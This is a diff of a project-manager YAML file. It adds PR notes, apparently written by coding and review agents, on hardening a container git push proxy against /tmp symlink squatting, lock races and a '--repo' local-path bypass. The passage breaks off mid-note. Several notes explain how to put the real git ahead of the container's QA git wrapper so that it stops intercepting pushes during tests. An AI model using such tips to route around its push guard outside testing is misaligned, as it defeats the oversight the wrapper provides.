@@ -9,7 +9,7 @@ project:
   repo: https://github.com/mjtomei/project_manager.git
   base_branch: master
   backend: github
-  active_pr: pr-e102089
+  active_pr: pr-16e45ba
   guide_deps_reviewed: true
   repo_id: 828c8d0a91034cd541f443dd0aee62961e2af75a
   last_pr_sync: '2026-03-02T01:48:48.618942+00:00'
@@ -6849,7 +6849,7 @@ prs:
   gh_pr: https://github.com/mjtomei/project_manager/pull/143
   gh_pr_number: 143
   created_at: '2026-03-10T00:41:37.907137+00:00'
-  updated_at: '2026-04-07T22:44:24.695069+00:00'
+  updated_at: '2026-10-27T16:34:23.765504+00:00'
   started_at: '2026-03-14T04:37:49.204416+00:00'
   reviewed_at: '2026-04-07T22:44:24.695069+00:00'
   merged_at: null
@@ -6858,6 +6858,39 @@ prs:
     text: 'QA INPUT_REQUIRED:  (workdir: /home/mjtomei/.pm/workdirs/qa/pr-ac12b47-79d4f9af4b607a9b)'
     created_at: '2026-04-07T14:13:07Z'
     last_edited: '2026-04-07T14:13:07Z'
+  - id: note-01f101a
+    text: 'Heads-up from pr-748e708 (workdir-keyed push proxies, merged-to-be): shared
+      proxy socket dirs are now named /tmp/pm-push-proxy-{session_tag}-{pr_id}-{workdir_token}
+      (hash of the host workdir realpath), and the hashed fallback still gets a long-named
+      symlink, so a `/tmp/pm-push-proxy-{session_tag}-*` glob still matches every
+      case. Two adjustments for cleanup_stale_proxy_dirs/restart_dead_proxies: (1)
+      when stopping a shared proxy dir, call `_kill_proxy_socket(sock, remove_dir=False)`
+      — removing the dir breaks a container that still bind-mounts it (the S18 failure);
+      remove dirs only at full session teardown, where `stop_session_proxies` now
+      does it. (2) `start_push_proxy` now takes the workdir and keys on it, so restart_dead_proxies
+      must pass the workdir it already reads from the /workspace bind mount, else
+      it will create a proxy for the wrong key. Also: `_remove_proxy_dirs` refuses
+      to rmtree a path that does not resolve to a proxy dir directly under /tmp —
+      keep that guard if you re-implement sweeping. (2026-10-27)'
+    created_at: '2026-10-27T05:14:34Z'
+    last_edited: '2026-10-27T05:14:34Z'
+  - id: note-10475af
+    text: 'pr-748e708 (workdir-keyed push proxies, 2026-10-27) changed the shared-proxy
+      teardown surface this PR will call: (1) stop_push_proxy on a shared proxy now
+      REMOVES the socket + proxy.json but KEEPS the socket directory (a container
+      may still bind-mount it; deleting it was the S18 failure) — a stale-proxy sweep
+      must not rmtree that directory unless it also knows no container mounts it;
+      (2) stop_session_proxies/stop_all_proxies already do the directory removal at
+      teardown, through _stop_socket_under_lock (per-directory start lock, non-blocking)
+      and _remove_proxy_dirs (refuses non-proxy paths, foreign-uid dirs, live proxies,
+      and dirs whose start lock is held) — reuse those helpers instead of re-implementing
+      a /tmp glob sweep; (3) keys are now 3-part "{session_tag}\0{pr_id}\0{workdir_token}"
+      and shared proxies are tracked only in _proxy_refs, not _active_proxies. Cross-process
+      refcounting is still in-process only, so a stale-proxy cleanup that removes
+      a proxy another process still references is exactly the gap this PR leaves for
+      you.'
+    created_at: '2026-10-27T16:34:23Z'
+    last_edited: '2026-10-27T16:34:23Z'
   workdir: /home/mjtomei/.pm/workdirs/project-manager-828c8d0a/pm-pr-ac12b47-session-cleanup-for-stale-containers-ab512a43
 - id: pr-53e47a1
   plan: tui-ux
@@ -11830,7 +11863,7 @@ prs:
   gh_pr: null
   gh_pr_number: null
   created_at: '2026-04-24T20:54:20.188876+00:00'
-  updated_at: '2026-10-22T14:17:54.192707+00:00'
+  updated_at: '2026-10-27T17:58:00.042338+00:00'
   started_at: null
   reviewed_at: null
   merged_at: null
@@ -11866,6 +11899,17 @@ prs:
       WIP; preserve its work and finish integrations/tests.'
     created_at: '2026-10-22T15:34:41Z'
     last_edited: '2026-10-22T15:34:41Z'
+  - id: note-404a5b1
+    text: 'Shared helper from pr-8cdbe60 (container git proxy scope fix): pm_core/push_proxy.py
+      now has module-level _long_option_match(arg, options), which returns the long
+      option git would read arg as (an exact match or any prefix, with or without
+      =value; ambiguous prefixes match, failing closed). pr-8cdbe60 uses it with _BROAD_PUSH_OPTIONS
+      (--all/--branches/--mirror/--tags) and deliberately left _check_dangerous_flags
+      unchanged to avoid a double edit. Whichever PR merges second: route _check_dangerous_flags
+      through it (matched = _long_option_match(arg, cls._DANGEROUS_GIT_OPTIONS)) so
+      there is one prefix-matching helper.'
+    created_at: '2026-10-27T17:57:59Z'
+    last_edited: '2026-10-27T17:57:59Z'
 - id: pr-d43d362
   plan: bugs
   title: Container pm user hardcoded at UID 1000 breaks for hosts with non-1000 UID
@@ -13449,11 +13493,23 @@ prs:
   gh_pr: null
   gh_pr_number: null
   created_at: '2026-05-02T22:38:22.256223+00:00'
-  updated_at: '2026-05-02T22:38:22.256223+00:00'
+  updated_at: '2026-10-27T05:14:51.676556+00:00'
   started_at: null
   reviewed_at: null
   merged_at: null
-  notes: []
+  notes:
+  - id: note-1f6cf82
+    text: 'Heads-up from pr-748e708 review: the code path this bug describes no longer
+      exists. `pm_core/push_proxy.py` no longer runs `git -C <target> fetch --update-head-ok
+      <source> <branch>:<branch>` (grep for `update-head-ok`/`denyCurrentBranch` returns
+      nothing on master). `_execute_push` now rejects any push whose origin resolves
+      to a local path, fail-closed, with a message telling scenario clones to rewrite
+      origin to the real upstream. So the "staged revert / desynced index" symptom
+      should be gone; the remaining risk is the explicit rejection (pr-d82e0f1 covers
+      PR workdirs whose origin fetch URL is still local). Please confirm against master
+      before implementing — this PR may be closable. (2026-10-27)'
+    created_at: '2026-10-27T05:14:51Z'
+    last_edited: '2026-10-27T05:14:51Z'
 - id: pr-6bf587b
   plan: bugs
   title: 'Bug: sync kills merge propagation window (variants 1/2) when PR detected
@@ -13768,11 +13824,64 @@ prs:
   gh_pr: null
   gh_pr_number: null
   created_at: '2026-05-03T16:02:14.081159+00:00'
-  updated_at: '2026-05-03T16:02:14.081159+00:00'
+  updated_at: '2026-10-27T06:16:13.699144+00:00'
   started_at: null
   reviewed_at: null
   merged_at: null
-  notes: []
+  notes:
+  - id: note-c46e45f
+    text: 'Impl 54664e53. qa/sign_off (and closed) are now inspection-only: plain
+      `pm pr review` focuses the existing review-<display> window and writes nothing;
+      `--fresh`/`--review-loop` are refused while the PR is in those phases (would
+      start a second agent); `--no-window` is a no-op there; closed is refused like
+      merged. Evidence: /pm-captures/impl/{pre-fix,post-fix}/ — incl. signoff-exactly-once/
+      (real `pm pr review` CLI + picker direct dispatch between the launch stamp and
+      the driver tick; the original SIGNOFF_MERGE still routes once, record sha=HEAD,
+      second tick unchanged). Tests: tests/test_pr.py (20) + picker stdout-surfacing
+      test. Full suite 3771 passed, 1 pre-existing env failure (test_hook_events::test_installer_writes_standalone_receiver,
+      also fails on 59a31f40). Trap: run tests with PATH=/usr/bin:/bin — the QA git
+      wrapper intercepts local `git fetch`.'
+    created_at: '2026-10-27T04:49:04Z'
+    last_edited: '2026-10-27T04:49:04Z'
+  - id: note-648c467
+    text: 'Refiner S6 (two-inspector race) harness notes: (1) pm pr start refuses
+      until the PR entry is committed on base_branch — after pm pr add run git add
+      -A && git commit before starting. (2) fake-claude: _all:{} alone routes review
+      through the catch-all default PASS, so the review pane exits and the window
+      closes; set review:{verdicts:[]} to keep the review window open. (3) The sign-off
+      step lock is ~/.pm/workdirs/.signoff-step-<pr_id>.lock; hold it with flock to
+      simulate a driver mid-step. (4) Source the venv first, then export a PATH whose
+      git is the real /usr/bin/git ahead of the QA git wrapper, before pm session.'
+    created_at: '2026-10-27T06:00:48Z'
+    last_edited: '2026-10-27T06:00:48Z'
+  - id: note-cf8c29c
+    text: 'QA S6 (two inspectors racing the phase driver): PASS, no code change. Live
+      fixture pr-09ff3f8 (qa) / pr-7b4aa8f (sign_off), session pm-pm-test-1793081061-90127183.
+      Harness notes for future runs: (1) the `## Sign-off return` block is rendered
+      by `pm pr show` from the signoff_return record — grepping project.yaml for that
+      heading always reads 0; count it on `pm pr show` output. (2) `pm pr show` prints
+      two `Status:` lines (`Status:` then `Status: in_base`) — use `grep -m1`. (3)
+      This host is aarch64 and has no fzf/agg in the image: download agg-aarch64-unknown-linux-gnu
+      from the asciinema releases and chmod +x; the no-fzf picker fallback needs `d`
+      then Enter (not just `d`). (4) Interactive panes source ~/.bashrc, whose last
+      line activates /home/pm/.local/share/pm/venv and re-prepends the QA git wrapper
+      — export PATH inside the pane (or use a non-interactive `bash -c` pane) before
+      running pm.'
+    created_at: '2026-10-27T06:16:13Z'
+    last_edited: '2026-10-27T06:16:13Z'
+  model: provider:deepseek-flash
+  session_models:
+    impl: provider:deepseek-flash
+    review: provider:deepseek-flash
+    qa: provider:deepseek-flash
+    qa_planning: provider:deepseek-flash
+    qa_scenario: provider:deepseek-flash
+    qa_concretize: provider:deepseek-flash
+    qa_verification: provider:deepseek-flash
+    qa_finalize: provider:deepseek-flash
+    qa_interactive: provider:deepseek-flash
+    merge: provider:deepseek-flash
+    signoff: provider:claude-work
 - id: pr-0c530e1
   plan: bugs
   title: Cleanup leaves QA/review loop state stale and stops containers sequentially
@@ -14463,11 +14572,965 @@ prs:
   gh_pr: null
   gh_pr_number: null
   created_at: '2026-05-04T11:58:45.935220+00:00'
-  updated_at: '2026-05-04T11:58:45.935220+00:00'
+  updated_at: '2026-10-28T03:34:01.330534+00:00'
   started_at: null
   reviewed_at: null
   merged_at: null
-  notes: []
+  notes:
+  - id: note-6245c1d
+    text: 'Impl (2026-10-27): shared push proxies are now keyed by (session_tag, pr_id,
+      workdir_token); impl/review/sign-off on the PR workdir share one proxy, each
+      QA scenario clone gets its own. start_push_proxy refuses to replace a live proxy
+      serving a different workdir/branch (metadata sidecar), takes a per-dir flock
+      around check-and-spawn, and raises PushProxyError if the daemon is not connectable
+      within 5 s. Requests naming a foreign or missing workdir are rejected explicitly;
+      no silent cross-clone push. Shared stops keep the socket directory (a container
+      may still bind-mount it); stop_session_proxies/stop_all_proxies remove dirs
+      at teardown. get_proxy_socket_path takes workdir; container.py callers pass
+      it. Evidence: /pm-captures/impl/pre-fix/repro-proxy-key and /pm-captures/impl/post-fix/verify-proxy-key.
+      Tests: tests/test_push_proxy.py TestWorkdirKeyedProxies (11 new) and the full
+      suite (3763 passed, 1 skipped; run with PATH=/usr/bin so the container git wrapper
+      does not intercept test pushes). #249 socket disappearance: cause NOT established;
+      this change adds readiness/recovery and never deletes a shared socket dir, but
+      does not claim the workdir collision caused it. Container ownership/cleanup
+      stays with pr-1139060 (#241); no duplication here.'
+    created_at: '2026-10-27T04:54:58Z'
+    last_edited: '2026-10-27T05:04:04Z'
+  - id: note-0185a95
+    text: 'Review-loop 7d11 i1 (2026-10-27): reviewed 3de978b5. Design is sound and
+      matches the spec (workdir-keyed key/dir, metadata refusal, per-dir flock, readiness
+      raise, dir retention, foreign/missing-workdir rejection); captures are convincing
+      — pre-fix shows impl+QA on one socket with the impl push force-updating to the
+      QA commit and the dir being removed, post-fix shows distinct sockets and the
+      impl dir surviving QA cleanup. I also confirmed test_impl_and_qa_get_distinct_proxies
+      fails on 74462d76 for the right reason (assert 1 == 3, all three containers
+      on /tmp/pm-push-proxy-repo-wd-pr-wd/push.sock). Four fixes applied on top: (1)
+      PushProxy.stop() now checks the socket inode before unlinking (_owns_socket_path)
+      — R3 required "stop() must not unlink a socket it does not own" and only the
+      start()-returned-False case was guarded, so a daemon whose path was rebound
+      would delete the replacement socket + metadata; (2) _remove_proxy_dirs no longer
+      rmtree"s a path that resolves outside a /tmp/pm-push-proxy-* dir (_is_proxy_dir)
+      — /tmp is world-writable, so a planted /tmp/pm-push-proxy-<tag>-* symlink would
+      have made session teardown delete an arbitrary directory; the link is still
+      unlinked, its target is not; (3) a non-string "workdir" in a request is rejected
+      explicitly instead of raising TypeError and dropping the connection with no
+      response; (4) corrected the stale create_container comment claiming the proxy
+      handles local-path origins (it has been fail-closed since before this PR). Tests:
+      added the inode-ownership, foreign-symlink and non-string-workdir cases plus
+      an autouse fixture that sweeps the /tmp dirs/locks the tests now leave behind
+      (shared stops keep dirs by design) — 66 push-proxy tests pass. Full suite: 3695
+      passed, 55 failed, 17 errors; every failure is a pre-existing environment failure
+      (test_merge_publish, test_signoff_integration, test_markdown_render missing
+      markdown module, test_git_ops pull-rebase, test_hook_events) and reproduces
+      identically at 3de978b5 without these edits. Residual, explicitly out of scope
+      per spec R8: refcounts are in-process only, so a same-workdir container owned
+      by another process can still lose its daemon when this process drops its last
+      ref (now recoverable — the dir survives and create_container/reuse or restart_dead_proxies
+      respawns). Left notes on pr-ac12b47 (socket-dir naming, remove_dir=False, pass
+      workdir to start_push_proxy) and pr-e43e4b0 (the fetch --update-head-ok path
+      it targets no longer exists). (2026-10-27)'
+    created_at: '2026-10-27T05:20:32Z'
+    last_edited: '2026-10-27T05:20:32Z'
+  - id: note-6235bfb
+    text: 'Review-loop 7d11 i2 (2026-10-27): reviewed afeaa283. Fixes applied: (1)
+      the daemon *process* now exits when its socket path is rebound — the spec edge
+      case "daemon orphaned after its socket path is replaced → inode check makes
+      it exit" was only half-true: _serve_loop noticed the rebind but the __main__
+      wait loop still tested os.path.exists(_sock), so a daemon whose path was unlinked
+      and rebound inside one 2 s tick lived forever holding no socket. Reproduced
+      at afeaa283 (old daemon still alive 8 s after a new one rebound its path; note
+      os.kill(pid,0) reports a reaped child as alive — use Popen.poll) and verified
+      fixed; the wait loop is now _wait_for_socket_exit(), sharing PushProxy.socket_is_current()
+      with the serve loop. (2) socket_is_current() restores an existence check when
+      _sock_ino is None (stat failed at bind time) — the i1 inode refactor had dropped
+      the old os.path.exists check for that case, so such a daemon never exited on
+      socket removal. (3) _remove_proxy_dirs() also refuses to rmtree a directory
+      whose st_uid is not ours, completing i1 symlink-target guard (_is_proxy_dir)
+      for world-writable /tmp; a missing dir still gets its stale .lock cleared. Tests:
+      4 new (socket_is_current removal/rebind, no-inode fallback, _wait_for_socket_exit
+      exits, uid guard) — 70 push-proxy tests pass. Full suite (PATH=/usr/bin:/bin,
+      PYTHONPATH=/workspace): 3758 passed, 1 skipped, 13 failed — all environment:
+      12 test_markdown_render (no markdown module) + test_hook_events::test_installer_writes_standalone_receiver,
+      both pre-existing. Re-verified the bug-fix evidence: post-fix verify script
+      passes on HEAD, and test_impl_and_qa_get_distinct_proxies fails at 74462d76
+      with assert 1 == 3 (all three containers on /tmp/pm-push-proxy-repo-wd-pr-wd/push.sock).
+      Spec updated with a "Review iteration 2 refinements" section.'
+    created_at: '2026-10-27T05:42:38Z'
+    last_edited: '2026-10-27T05:42:38Z'
+  - id: note-4c92538
+    text: 'Review-loop b067 i1 (2026-10-27): reviewed 6a8aadcf. Re-verified the fix
+      at HEAD with real subprocess daemons (distinct socket per workdir, foreign-workdir
+      request rejected with an explicit message, shared stop keeps the socket dir,
+      restart heals in place, session sweep removes the dirs) and the full suite (3761
+      passed, 1 skipped, 13 known environment failures: 12 test_markdown_render +
+      test_hook_events). Three lifecycle guards added: (1) _remove_proxy_dirs now
+      takes the per-directory start lock (non-blocking) and re-checks proxy_is_alive
+      before rmtree, so a session sweep racing a container start can no longer delete
+      the socket dir a container bind-mounts (the S18 failure through another door);
+      (2) _clear_lock_file probes with LOCK_NB before unlinking a start-lock file,
+      and _kill_proxy_socket(lock_held=True) is used by stop_session_proxies'' kill
+      loop, which now also skips a directory whose start is in flight — teardown can
+      no longer break the R7 serialisation or kill a proxy that is being created;
+      (3) added the missing R7 test (3 concurrent starts -> exactly one spawn; 3 spawns
+      when _start_lock is stubbed out) plus sweep-guard tests. 73 push-proxy tests
+      pass. Residual, unchanged and out of scope: in-process refcounts only (cross-process
+      cleanup stays with pr-ac12b47/#241).'
+    created_at: '2026-10-27T06:19:47Z'
+    last_edited: '2026-10-27T06:19:47Z'
+  - id: note-cdc3517
+    text: 'Review-loop db89 i1 (2026-10-27): reviewed c356eb4d (unchanged since b067
+      i1). Design and evidence re-verified at HEAD: /pm-captures/impl/post-fix/verify-proxy-key
+      passes (distinct socket per workdir, impl push lands its own commit, QA stop
+      leaves the impl socket dir intact), and test_impl_and_qa_get_distinct_proxies
+      fails at 74462d76 for the right reason (assert 1 == 3, all three containers
+      on /tmp/pm-push-proxy-repo-wd-pr-wd/push.sock). Five fixes applied, each with
+      a test that fails on c356eb4d and passes at HEAD: (1) start_push_proxy''s spawn
+      path did `_proxy_refs[key] = {container_name}`, replacing the set — if two containers
+      shared a workdir and the socket died, the first to restart dropped the sibling''s
+      ref, so stopping it later killed the proxy the sibling still used. Both paths
+      now use _add_proxy_ref(), which adds to the set and drops a container''s ref
+      under an old key when it re-registers against a different workdir. (2) R4''s
+      type check ran after `request.get("workdir") or None`, so falsy non-strings
+      ([], 0, false) were treated as "field absent" and silently fell back to self.workdir;
+      the check now runs on the raw value (only "" still means absent). (3) _kill_proxy_socket
+      had none of the teardown guards _remove_proxy_dirs got in i1/i2, yet stop_all_proxies/stop_session_proxies
+      reach it through a /tmp glob: a planted /tmp/pm-push-proxy-… symlink could make
+      it unlink push.sock/proxy.json inside an arbitrary directory, and another user''s
+      proxy-shaped dir would raise EPERM and abort the whole sweep. It now requires
+      a proxy dir directly under the glob''s parent and skips foreign-owned dirs (link
+      still unlinked, target untouched). (4) wrap_claude_cmd wrapped PushProxyError
+      into ContainerError("… Is docker running?"), hiding R5''s real reason; it now
+      reports "push proxy unavailable — <why>". (5) Incidental: _kill_proxy_socket
+      only caught FileNotFoundError on the socket unlink, but docker creates a directory
+      at a bind-mounted socket path (older pm mounted the file itself); IsADirectoryError
+      would abort stop_push_proxy/stop_session_proxies/stop_all_proxies — it now removes
+      it. Tests: tests/test_push_proxy.py 81 passed, tests/test_container.py passed;
+      full suite 3770 passed, 1 skipped, 13 failed (all pre-existing environment:
+      12 test_markdown_render missing markdown module + test_hook_events::test_installer_writes_standalone_receiver),
+      run with PATH=/usr/bin:/bin, PYTHONPATH=/workspace. Residual, out of scope:
+      in-process refcounts only (cross-process cleanup stays with #241/pr-ac12b47);
+      one daemon per workdir means a QA loop with N scenarios runs N proxy processes
+      (acceptable now; option (3), workdir-per-request, remains the cleaner long-term
+      design). (2026-10-27)'
+    created_at: '2026-10-27T06:50:45Z'
+    last_edited: '2026-10-27T06:50:45Z'
+  - id: note-6977072
+    text: 'Review-loop db89 i2 (2026-10-27): reviewed 6941c923 (unchanged since db89
+      i1). Re-verified at HEAD: /pm-captures/impl/post-fix/verify-proxy-key passes
+      (distinct socket per workdir, impl push lands its own commit, QA stop leaves
+      the impl socket dir intact), and test_impl_and_qa_get_distinct_proxies fails
+      at 74462d76 (assert 1 == 3). Seven fixes applied, each with a test: (1) PushProxy.stop()
+      no longer unlinks a socket it never bound - start() sets _server_socket before
+      bind(), so a bind() failure left _sock_ino unset and _owns_socket_path() returned
+      True on the no-inode fallback, deleting another daemon socket; the instance
+      now records _bound after a successful bind (reproduced at 6941c923: the file
+      is gone after stop()). (2) stop_push_proxy shared path now goes through _stop_shared_proxy_socket(),
+      which takes the per-directory start lock (non-blocking) and re-checks _proxy_refs
+      before unlinking - a concurrent start that reused the socket between the last
+      ref being dropped and the kill could otherwise have it unlinked from under it
+      (S18 through the per-container path). Lock order unchanged (_start_lock then
+      _proxy_lock). (3) The legacy per-container stop gets the same guard and passes
+      lock_held=True; without it the _clear_lock_file LOCK_NB probe saw our own lock
+      and leaked a .lock on every legacy stop. (4) stop_session_proxies also derives
+      candidate sockets from the in-process registry, so a hashed socket dir whose
+      long-name symlink is missing (the {tag}-* glob cannot match the hash) no longer
+      survives teardown; it failed at 6941c923 with count 0. (5) A non-object JSON
+      request (e.g. ["origin"]) used to raise AttributeError and be dropped with no
+      response; now rejected explicitly. (6) Socket-file removal consolidated into
+      _unlink_socket_file() at all five unlink sites (module-level import shutil),
+      so the IsADirectoryError branch cannot be lost at a future call site. Tests:
+      tests/test_push_proxy.py 88 passed, tests/test_container.py passed (189 together).
+      Full suite: 3777 passed, 1 skipped, 13 failed - all pre-existing environment
+      (12 test_markdown_render missing markdown module + test_hook_events::test_installer_writes_standalone_receiver).
+      Residual, unchanged and out of scope: in-process refcounts only (cross-process
+      cleanup stays with #241/pr-ac12b47); one daemon per workdir (option (3), workdir-per-request,
+      remains the cleaner long-term design); stop_all_proxies (no non-test callers)
+      still sweeps without the start-lock guard - if it gains a caller it should use
+      the same guard. (2026-10-27T07:19:37Z)'
+    created_at: '2026-10-27T07:19:45Z'
+    last_edited: '2026-10-27T07:19:45Z'
+  - id: note-533ff24
+    text: 'Review-loop db89 i3 (2026-10-27): reviewed 848ab98c (unchanged since db89
+      i2). Re-verified at HEAD: /pm-captures/impl/post-fix/verify-proxy-key passes
+      (distinct socket per workdir, impl push lands its own commit, QA stop leaves
+      the impl socket dir intact); test_impl_and_qa_get_distinct_proxies fails at
+      74462d76 (2-part key -> all three containers on one socket). Four fixes applied,
+      each with a test that fails at 848ab98c for the right reason: (1) start_push_proxy
+      legacy path registered _container_to_proxy_key after releasing _start_lock,
+      so a concurrent stop_push_proxy could pass its re-check and unlink the socket
+      the restart had just spawned (the shared path registers under the lock); it
+      now registers under the lock via a new _drop_old_ref() shared with _add_proxy_ref().
+      (2) flock locks the inode, not the name: a lock file unlinked between open()
+      and flock() left the holder with an invisible lock, letting a third process
+      create a fresh file and enter check-and-spawn concurrently; _start_lock now
+      verifies with _fd_is_path_file() that the locked file is still the one at the
+      lock path and retries (bounded; blocking raises PushProxyError), and _clear_lock_file
+      refuses to unlink a replacement. (3) _shared_sock_dir discovery symlink is best-effort
+      again: an OSError (name too long) no longer fails proxy start; teardown finds
+      hashed dirs via the registry. (4) Docstring: PushProxy is no longer "single-client
+      for one container". Tests: tests/test_push_proxy.py 92 passed, tests/test_container.py
+      101 passed; full suite 3781 passed, 1 skipped, 13 failed (all pre-existing environment:
+      12 test_markdown_render missing markdown module + test_hook_events::test_installer_writes_standalone_receiver),
+      run with PATH=/usr/bin:/bin, PYTHONPATH=/workspace. Incidental (pre-existing,
+      out of the spec scope "dangerous-flag rejection unchanged"): filed pr-a9803aa
+      - git push --repo=<local path> bypasses the local-path-origin rejection because
+      _extract_remote_name only inspects the first positional remote. Residual, unchanged
+      and out of scope: in-process refcounts only (cross-process cleanup stays with
+      #241/pr-ac12b47); one daemon per workdir (option (3), workdir-per-request, remains
+      the cleaner long-term design); stop_all_proxies (no non-test callers) still
+      sweeps without the start-lock guard.'
+    created_at: '2026-10-27T07:49:36Z'
+    last_edited: '2026-10-27T07:49:36Z'
+  - id: note-68f453f
+    text: 'Review-loop db89 i4 (2026-10-27): reviewed 23b21cc0 (unchanged since db89
+      i3). Re-verified at HEAD: /pm-captures/impl/post-fix/verify-proxy-key passes
+      (distinct socket per workdir, impl push lands its own commit, QA stop leaves
+      the impl socket dir intact); test_impl_and_qa_get_distinct_proxies fails at
+      74462d76 for the right reason (all three containers on /tmp/pm-push-proxy-repo-wd-pr-wd/push.sock,
+      assert 1 == 3). Five fixes applied, each with a test that fails at 23b21cc0
+      and passes at HEAD: (1) _remove_proxy_dirs compared the resolved entry path
+      against the literal glob parent; where /tmp is a symlink (macOS /tmp -> /private/tmp)
+      every legitimate proxy dir was refused and teardown leaked them — the parent
+      is now realpath-ed (reproduced: dir survives the sweep). (2) _start_lock let
+      os.open()/fcntl.flock() raise PermissionError for a lock file another user planted
+      in world-writable /tmp: a teardown sweep aborted, and a start surfaced through
+      wrap_claude_cmd as "Is docker running?" — non-blocking now treats it like busy
+      (yields False), blocking raises PushProxyError (reproduced: PermissionError
+      escapes both modes). (3) _shared_sock_dir rmtree-d a real directory squatting
+      on the long discovery name without checking ownership; it now requires st_uid
+      == ours, matching the sweep/kill guards from i1-i2. (4) listen(1) -> listen(16):
+      the daemon serves one request at a time (a push can run 120 s) and proxy_is_alive
+      probes connect without sending, so one queued probe made the next connect time
+      out and a live-but-busy proxy was replaced — the failure R3 exists to prevent.
+      (5) build_exec_cmd EXIT trap (legacy per-container proxies) removed push.sock
+      then rmdir-d the dir, but the new proxy.json sidecar kept it non-empty so the
+      rmdir failed and the dir leaked; the trap now removes the sidecar first. Tests:
+      tests/test_push_proxy.py 95 passed, tests/test_container.py 101 passed (196
+      together); full suite 3784 passed, 1 skipped, 13 failed (all pre-existing environment:
+      12 test_markdown_render missing markdown module + test_hook_events::test_installer_writes_standalone_receiver),
+      run with PATH=/usr/bin:/bin, PYTHONPATH=/workspace. Residual, unchanged and
+      out of scope: in-process refcounts only (cross-process cleanup stays with #241/pr-ac12b47);
+      one daemon per workdir (option (3), workdir-per-request, remains the cleaner
+      long-term design); stop_all_proxies (no non-test callers) still sweeps without
+      the start-lock guard; proxy_is_alive still cannot distinguish a busy daemon
+      from a dead one beyond the larger backlog. Also noted on pr-a9803aa: the local-path-origin
+      rejection is bypassed by a positional local path/file:// URL, not only --repo
+      (pre-existing).'
+    created_at: '2026-10-27T08:15:36Z'
+    last_edited: '2026-10-27T08:15:36Z'
+  - id: note-b4a3eac
+    text: 'Review-loop db89 i5 (2026-10-27): reviewed ece0e02c (unchanged since db89
+      i4). Re-verified at HEAD: /pm-captures/impl/post-fix/verify-proxy-key passes
+      (distinct socket per workdir, impl push lands its own commit, QA stop leaves
+      the impl socket dir intact); test_impl_and_qa_get_distinct_proxies still fails
+      at 74462d76 (2-part key -> all three containers on one socket). Three fixes
+      applied, each with a test that fails at ece0e02c for the right reason: (1) a
+      regular file squatting on the socket-directory name in world-writable /tmp made
+      os.makedirs raise a bare FileExistsError out of start_push_proxy, which wrap_claude_cmd
+      reported as "Is docker running?"; _start_lock now converts it like the unusable-lock-file
+      case (blocking -> PushProxyError naming the directory, non-blocking -> yields
+      False so teardown skips), the legacy per-container path raises PushProxyError
+      directly, and _shared_sock_dir treats its own makedirs as best-effort. (2) The
+      spec edge case "Hash collision -> metadata check (R3) refuses the mismatch"
+      was only half-implemented: R3 ran on the reuse path, so a dead socket whose
+      proxy.json recorded a different workdir (only possible via a token collision)
+      was silently replaced by a daemon for the requested clone; the spawn path now
+      reads the stale sidecar and raises PushProxyConflict naming both paths. (3)
+      _start_proxy_subprocess let subprocess.Popen raise a bare OSError (e.g. missing
+      interpreter), escaping start_push_proxy and again surfacing as "Is docker running?";
+      it now logs and returns False so R5''s PushProxyError names the socket and workdir,
+      matching its documented contract. Tests: test_unusable_socket_dir_is_skipped_by_teardown,
+      test_start_reports_a_squatted_socket_dir_as_proxy_error, test_legacy_start_reports_a_squatted_dir_as_proxy_error,
+      test_dead_socket_with_foreign_metadata_is_refused, test_spawn_failure_is_reported_as_a_proxy_error;
+      tests/test_push_proxy.py + tests/test_container.py 201 passed (run with PATH=/usr/bin:/bin
+      so the container git wrapper does not intercept test pushes). Residual, unchanged
+      and out of scope: in-process refcounts only (cross-process cleanup stays with
+      #241/pr-ac12b47); one daemon per workdir (option (3), workdir-per-request, remains
+      the cleaner long-term design); stop_all_proxies (no non-test callers) still
+      sweeps without the start-lock guard; proxy_is_alive still cannot distinguish
+      a busy daemon from a dead one beyond the larger backlog. (2026-10-27)'
+    created_at: '2026-10-27T08:33:35Z'
+    last_edited: '2026-10-27T08:33:35Z'
+  - id: note-98537c1
+    text: 'Review-loop db89 i6 (2026-10-27): reviewed ff17b1b8. Re-verified at HEAD:
+      /pm-captures/impl/post-fix/verify-proxy-key passes (distinct socket per workdir,
+      impl push lands its own commit, QA stop leaves the impl socket dir intact);
+      test_impl_and_qa_get_distinct_proxies still fails at 74462d76 (2-part key ->
+      all three containers on one socket). Two start-path gaps fixed, each with a
+      test that fails at ff17b1b8 for the right reason: (1) a symlink planted at the
+      shared socket-directory name was followed, so start_push_proxy deleted <target>/push.sock
+      and the daemon would write proxy.json and bind inside whatever directory the
+      link pointed at (reproduced: the target push.sock is gone after a start); (2)
+      a directory we cannot write (or one owned by another user) made _unlink_socket_file
+      raise a bare PermissionError out of start_push_proxy, which wrap_claude_cmd
+      reported as "Is docker running?" - the same misdiagnosis i5 removed for the
+      squatted-file case (reproduced: PermissionError escapes). _start_lock now calls
+      the new _sock_dir_start_problem() before touching the dir and raises PushProxyError
+      naming the reason (is a symlink / is owned by another user / is not writable).
+      The check applies to starts only (blocking=True): teardown deliberately passes
+      the long discovery symlink to _start_lock, and refusing it there would leave
+      a live proxy and its dir surviving stop_session_proxies after a restart, when
+      the registry is empty; teardown keeps its own guards (_kill_proxy_socket, _remove_proxy_dirs).
+      test_teardown_lock_still_accepts_a_symlinked_dir pins that asymmetry. Tests:
+      test_start_refuses_a_symlinked_socket_dir, test_legacy_start_refuses_a_symlinked_socket_dir,
+      test_start_reports_an_unwritable_socket_dir_as_proxy_error. tests/test_push_proxy.py
+      104 passed, tests/test_container.py 101 passed (PATH=/usr/bin:/bin so the container
+      git wrapper does not intercept test pushes). Residual, unchanged and out of
+      scope: in-process refcounts only (cross-process cleanup stays with #241/pr-ac12b47);
+      one daemon per workdir (option (3), workdir-per-request, remains the cleaner
+      long-term design); stop_all_proxies (no non-test callers) still sweeps without
+      the start-lock guard; proxy_is_alive still cannot distinguish a busy daemon
+      from a dead one beyond the backlog of 16.'
+    created_at: '2026-10-27T08:58:07Z'
+    last_edited: '2026-10-27T08:58:07Z'
+  - id: note-f2ae091
+    text: 'Review-loop db89 i7 (2026-10-27): reviewed fc5832d7 (unchanged since db89
+      i6). Re-verified at HEAD: /pm-captures/impl/post-fix/verify-proxy-key passes
+      (distinct socket per workdir, impl push lands its own commit, QA stop leaves
+      the impl socket dir intact); test_impl_and_qa_get_distinct_proxies fails at
+      74462d76 (all three containers on /tmp/pm-push-proxy-repo-wd-pr-wd/push.sock).
+      Four fixes applied, each with a test that fails at fc5832d7 for the right reason:
+      (1) _start_lock opens the start-lock file with O_NOFOLLOW — a symlink planted
+      at the world-writable /tmp lock name made our process flock (and possibly create)
+      a file at an arbitrary host path; teardown now treats it like any unusable lock
